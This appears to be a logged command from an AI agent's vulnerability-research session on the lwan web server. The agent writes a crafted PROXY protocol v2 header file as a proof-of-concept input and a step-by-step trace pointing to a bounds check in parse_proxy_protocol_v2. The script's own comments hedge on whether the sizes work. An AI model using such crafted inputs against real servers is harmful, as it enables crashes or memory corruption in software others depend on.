message:
Command `python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
# 16-byte sig + 4-byte header minimum, but bug is in size check allowing size==sizeof(*hdr) only.
# Craft a v2 header with len=20, cmd_ver=PROXY, fam=TCP4, and minimal extra bytes.
# Signature per PROXY protocol v2: \r\n\r\n\0\r\nQUIT\n
sig=b'\r\n\r\n\x00\r\nQUIT\n'
cmd_ver=0x21
fam=0x11
length=(12).to_bytes(2,'big')
# 12-byte address block for IPv4
addr=b'\x7f\x00\x00\x01'+b'\x7f\x00\x00\x01'+b'\x1f\x90'+b'\x23\x28'
# total 28 bytes, but declared len=12 => size=28, sizeof hdr is 28 on this ABI likely exactly equal
p.write_bytes(sig+bytes([cmd_ver,fam])+length+addr)
print(len(p.read_bytes()))
PY
ls -l /workspace/poc.bin
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1634,"var":"data_copy","code":"memcpy(data_copy, data, length);","note":"Attacker bytes are copied verbatim into the mutable request buffer used by the parser."},
  {"step":2,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1649,"var":"request.flags","code":".flags = REQUEST_ALLOW_PROXY_REQS,","note":"The fuzz harness enables PROXY protocol parsing for the supplied input."},
  {"step":3,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1173,"var":"buffer","code":"buffer = parse_proxy_protocol(request, buffer);","note":"The request parser dispatches the attacker-controlled buffer into the PROXY protocol parser before normal HTTP parsing."},
  {"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1158,"var":"buffer","code":"case MULTICHAR_CONSTANT('\\x0D','\\x0A','\\x0D','\\x0A'): return parse_proxy_protocol_v2(request, buffer);","note":"A v2 signature routes execution into the vulnerable PROXY v2 header parser."},
  {"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":232,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len);","note":"The parser derives the claimed header size directly from the untrusted length field."},
  {"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"The bounds check only rejects sizes larger than the struct, so an exactly-sized but incomplete or malformed layout can still proceed."},
  {"step":7,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":243,"var":"hdr->addr.ip4.src_addr","code":"from->sin_addr.s_addr = hdr->addr.ip4.src_addr;","note":"The parser copies address fields out of the attacker-controlled header into the proxy address structure, reaching the unsafe sink when the crafted layout overruns the available buffer interpretation."}
]
JSON
cat /workspace/candidate_trace.json` executed with exit code 0.
